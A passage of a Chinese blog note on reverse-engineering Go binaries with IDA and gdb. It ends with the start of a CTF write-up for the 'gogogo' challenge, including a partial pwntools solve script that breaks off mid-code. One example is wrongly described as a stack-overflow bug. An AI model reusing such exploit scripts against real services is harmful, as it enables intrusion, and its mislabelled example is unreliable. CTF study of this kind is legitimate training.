href="#编译及逆向" class="headerlink" title="编译及逆向"></a>编译及逆向</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写一个输出hello world的go的程序。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放到ida里</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.main</span></span><br><span class="line">void __cdecl main_main()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0[<span class="number">0</span>] = (__int64)&amp;RTYPE_string;</span><br><span class="line">  v0[<span class="number">1</span>] = (__int64)&amp;off_4D8F60;</span><br><span class="line">  fmt_Fprintln((__int64)&amp;go_itab__ptr_os_File_comma_io_Writer, os_Stdout, (__int64)v0, <span class="number">1</span>LL, <span class="number">1</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到v0[1]是输出参数</p><p>可以认为他的参数设置是，类型+值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写一个包含很多类型，语法的go语言程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">float32</span> = <span class="number">3.14</span></span><br><span class="line"><span class="keyword">var</span> c <span class="type">string</span> = <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line"><span class="keyword">var</span> d <span class="type">bool</span> = <span class="literal">true</span></span><br><span class="line"><span class="keyword">var</span> e []<span class="type">int</span> = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span> = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;one&quot;</span>: <span class="number">1</span>, <span class="string">&quot;two&quot;</span>: <span class="number">2</span>, <span class="string">&quot;three&quot;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">var</span> g <span class="keyword">chan</span> <span class="type">int</span> = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(a, b, c, d, e, f, g)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再看一个涉及多种类型的go程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.main</span></span><br><span class="line">void __cdecl main_main()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+50h] [rbp-A8h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+58h] [rbp-A0h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+60h] [rbp-98h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+68h] [rbp-90h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+70h] [rbp-88h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+78h] [rbp-80h]</span></span><br><span class="line">  __int64 v7[<span class="number">14</span>]; <span class="comment">// [rsp+80h] [rbp-78h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = runtime_newobject(&amp;RTYPE__5_int);</span><br><span class="line">  *(_QWORD *)v6 = <span class="number">1</span>LL;</span><br><span class="line">  *(_OWORD *)(v6 + <span class="number">8</span>) = xmmword_4DB908;</span><br><span class="line">  *(_OWORD *)(v6 + <span class="number">24</span>) = xmmword_4DB918;</span><br><span class="line">  v5 = runtime_makemap_small();</span><br><span class="line">  *(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;one&quot;</span>, <span class="number">3</span>LL) = <span class="number">1</span>LL;</span><br><span class="line">  *(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;two&quot;</span>, <span class="number">3</span>LL) = <span class="number">2</span>LL;</span><br><span class="line">  *(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;three&quot;</span>, <span class="number">5</span>LL) = <span class="number">3</span>LL;</span><br><span class="line">  v4 = runtime_makechan((__int64)&amp;RTYPE_chan_int, <span class="number">0</span>LL);</span><br><span class="line">  v3 = runtime_convT64(<span class="number">10</span>LL);</span><br><span class="line">  v2 = runtime_convT32(_f32_4048f5c3);          <span class="comment">// 3.14</span></span><br><span class="line">  v1 = runtime_convTstring((__int64)<span class="string">&quot;Hello, world!&quot;</span>, <span class="number">13</span>LL);</span><br><span class="line">  runtime_convTslice(v6, <span class="number">5</span>LL, <span class="number">5</span>LL);</span><br><span class="line">  v0 = ((__int64 (*)(void))loc_4540AD)();</span><br><span class="line">  v7[<span class="number">0</span>] = (__int64)&amp;RTYPE_int;</span><br><span class="line">  v7[<span class="number">1</span>] = v3;</span><br><span class="line">  v7[<span class="number">2</span>] = (__int64)&amp;RTYPE_float32;</span><br><span class="line">  v7[<span class="number">3</span>] = v2;</span><br><span class="line">  v7[<span class="number">4</span>] = (__int64)&amp;RTYPE_string;</span><br><span class="line">  v7[<span class="number">5</span>] = v1;</span><br><span class="line">  v7[<span class="number">6</span>] = (__int64)&amp;RTYPE_bool;</span><br><span class="line">  v7[<span class="number">7</span>] = (__int64)&amp;runtime_staticbytes + <span class="number">1</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = (__int64)&amp;RTYPE__slice_int;</span><br><span class="line">  v7[<span class="number">9</span>] = v0;</span><br><span class="line">  v7[<span class="number">10</span>] = (__int64)&amp;RTYPE_map_string_int;</span><br><span class="line">  v7[<span class="number">11</span>] = v5;</span><br><span class="line">  v7[<span class="number">12</span>] = (__int64)&amp;RTYPE_chan_int;</span><br><span class="line">  v7[<span class="number">13</span>] = v4;</span><br><span class="line">  fmt_Fprintln((__int64)&amp;go_itab__ptr_os_File_comma_io_Writer, os_Stdout, (__int64)v7, <span class="number">7</span>LL, <span class="number">7</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v6 = runtime_newobject(&amp;RTYPE__5_int);</span><br><span class="line">*(_QWORD *)v6 = <span class="number">1</span>LL;</span><br><span class="line">*(_OWORD *)(v6 + <span class="number">8</span>) = xmmword_4DB908;</span><br><span class="line">*(_OWORD *)(v6 + <span class="number">24</span>) = xmmword_4DB918;</span><br></pre></td></tr></table></figure><p><code>runtime_newobject</code>这个是类似于一个malloc的函数调用，关键字 <code>new</code> 同样也会被编译器翻译为此函数，所以<code>runtime_newobject</code>就是一个内存分配的核心函数，调用这个的原因是有些字符串(may?)是通过指针调用的，让我们gdb一下</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212524.png" alt="image-20240322131856847" style="zoom:50%;" /><p>可以看到一些其他的东西，比如string是在一个内存区域内，type也是，或许其中有一个是go的堆</p><p>我们再vmmap看一下</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212525.png" alt="image-20240322132743451" style="zoom:50%;" /><p>首先anon_c000000才是go使用的栈，而最下面是我们系统的栈，0x400000-0x48e000则是代码区，</p><p>首先吸引我的是heap区域，不知道是不是真正的heap区域</p><p>那就让我们进去看看</p><p>它分为好几个部分</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runtime.stackLarge</span><br><span class="line">runtime.m0</span><br><span class="line">runtime.cpuprof</span><br></pre></td></tr></table></figure><p>栈空间在运行时中包含两个重要的全局变量，分别是 <code>runtime.stackpool</code> 和<code>runtime.stackLarge</code>，这两个变量分别表示全局的栈缓存和大栈缓存，前者可以分配小于 32KB 的内存，后者用来分配大于 32KB 的栈空间</p><p>但是深究下去，或许会很复杂？等以后再说吧。。。。</p><p>之后的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;one&quot;</span>, <span class="number">3LL</span>) = <span class="number">1LL</span>;</span><br><span class="line">*(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;two&quot;</span>, <span class="number">3LL</span>) = <span class="number">2LL</span>;</span><br><span class="line">*(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;three&quot;</span>, <span class="number">5LL</span>) = <span class="number">3LL</span>;</span><br><span class="line">v4 = runtime_makechan((__int64)&amp;RTYPE_chan_int, <span class="number">0LL</span>);</span><br><span class="line">v3 = runtime_convT64(<span class="number">10LL</span>);</span><br><span class="line">v2 = runtime_convT32(_f32_4048f5c3);          <span class="comment">// 3.14</span></span><br><span class="line">v1 = runtime_convTstring((__int64)<span class="string">&quot;Hello, world!&quot;</span>, <span class="number">13LL</span>);</span><br><span class="line">runtime_convTslice(v6, <span class="number">5LL</span>, <span class="number">5LL</span>);</span><br><span class="line">v0 = ((__int64 (*)(<span class="type">void</span>))loc_4540AD)();</span><br><span class="line">v7[<span class="number">0</span>] = (__int64)&amp;RTYPE_int;</span><br><span class="line">v7[<span class="number">1</span>] = v3;</span><br><span class="line">v7[<span class="number">2</span>] = (__int64)&amp;RTYPE_float32;</span><br><span class="line">v7[<span class="number">3</span>] = v2;</span><br><span class="line">v7[<span class="number">4</span>] = (__int64)&amp;RTYPE_string;</span><br><span class="line">v7[<span class="number">5</span>] = v1;</span><br><span class="line">v7[<span class="number">6</span>] = (__int64)&amp;RTYPE_bool;</span><br><span class="line">v7[<span class="number">7</span>] = (__int64)&amp;runtime_staticbytes + <span class="number">1</span>;</span><br><span class="line">v7[<span class="number">8</span>] = (__int64)&amp;RTYPE__slice_int;</span><br><span class="line">v7[<span class="number">9</span>] = v0;</span><br><span class="line">v7[<span class="number">10</span>] = (__int64)&amp;RTYPE_map_string_int;</span><br><span class="line">v7[<span class="number">11</span>] = v5;</span><br><span class="line">v7[<span class="number">12</span>] = (__int64)&amp;RTYPE_chan_int;</span><br><span class="line">v7[<span class="number">13</span>] = v4;</span><br><span class="line">fmt_Fprintln((__int64)&amp;go_itab__ptr_os_File_comma_io_Writer, os_Stdout, (__int64)v7, <span class="number">7LL</span>, <span class="number">7LL</span>);</span><br></pre></td></tr></table></figure><p>可以看到参数就是先是一个类型，然后紧跟着数值，符合猜测</p><p>之后看一个有栈溢出漏洞的go程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写一个可以控制输出量的有栈溢出风险的简单go程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> s <span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++ &#123;</span><br><span class="line">s += fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到显然一个栈溢出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.main</span></span><br><span class="line">void __cdecl main_main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> char *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  _QWORD v9[<span class="number">2</span>]; <span class="comment">// [rsp+68h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>LL;</span><br><span class="line">  v2 = <span class="number">0</span>LL;</span><br><span class="line">  v3 = <span class="number">0</span>LL;</span><br><span class="line">  while ( v1 &lt; <span class="number">1000000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v1;                                    <span class="comment">// v7 v1是计数器</span></span><br><span class="line">    v8 = v3;</span><br><span class="line">    runtime_convT64(v1);</span><br><span class="line">    fmt_Sprintf(v0);</span><br><span class="line">    runtime_concatstring2(<span class="number">0</span>LL, v8);             <span class="comment">// 字符串拼接</span></span><br><span class="line">    v2 = v6;</span><br><span class="line">    v3 = v5;</span><br><span class="line">    v1 = v7 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = runtime_convTstring(v3, v2);             <span class="comment">// 将某个类型转换为字符串类型</span></span><br><span class="line">  v9[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">  v9[<span class="number">1</span>] = v4;</span><br><span class="line">  fmt_Fprintln(go_itab__ptr_os_File_comma_io_Writer, os_Stdout, v9, <span class="number">1</span>LL, <span class="number">1</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是显然ida里的反汇编总是那么出人意料</p><p>首先能一眼看出的是他调用了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2020虎符ctf-gogogo"><a href="#2020虎符ctf-gogogo" class="headerlink" title="2020虎符ctf -gogogo"></a>2020虎符ctf -gogogo</h2><p>这道题的核心主要是它修改了main函数的名称为<code>math_init</code>，我是通过IDA远程调试调出来的</p><p>注意点：</p><ol><li>go的ida远程调试要下断点，因为go是多线程的，不下断点容易出问题</li><li>go一定要调试，静态分析容易出问题</li><li>go要看汇编，反汇编因为寄存器和栈值得反复交换，使得他的机制很奇怪</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;120.25.148.180&quot;, 29561)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_cnt</span>(<span class="params">k</span>):</span><br><span class="line"><span class="keyword">if</span> k == <span class="number">7</span> :</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x54749110</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b *0x491ea1&#x27;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">num_list = []</span><br><span class="line">io.recvuntil(<span class="string">&quot;GUESS\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">x = <span class="number">2</span>*cnt</span><br><span class="line">y = <span class="number">2</span>*cnt+<span class="number">1</span></span><br><span class="line">io.sendline(<span class="string">F&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;x&#125;</span> <span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;0A0B&quot;</span> :</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;0A1B&quot;</span> :</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;0A2B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;1A1B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;1A2B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;2A1B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(num_list) == <span class="number">4</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">0</span>]))</span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">1</span>]))</span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">2</span>]))</span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line">idx = -<span class="number">1</span></span><br><span class="line">pos = [-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">idx = idx + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> idx == <span class="number">4</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">x = num_list[idx]</span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> times == (<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> pos[<span class="number">0</span>] == -<span class="number">1</span> :</span><br><span class="line">io.sendline(<span class="string">F&quot;<span class="subst">&#123;x&#125;</span> -1 -1 -1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">times = times + <span class="number">1</span></span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> judge_cnt(cnt) :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">pos[<span class="number">0</span>] = idx</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> times == (<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> pos[<span class="number">1</span>] == -<span class="number">1</span> :</span><br><span class="line">io.sendline(<span class="string">F&quot;-1 <span class="subst">&#123;x&#125;</span> -1 -1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">times = times + <span class="number">1</span></span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> judge_cnt(cnt) :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">pos[<span class="number">1</span>] = idx</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> times == (<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> pos[<span class="number">2</span>] == -<span class="number">1</span> :</span><br><span class="line">io.sendline(<span class="string">F&quot;-1 -1 <span class="subst">&#123;x&#125;</span> -1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">times = times + <span class="number">1</span></span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> judge_cnt(cnt) :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">pos[<span class="number">2</span>] = idx</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> times == 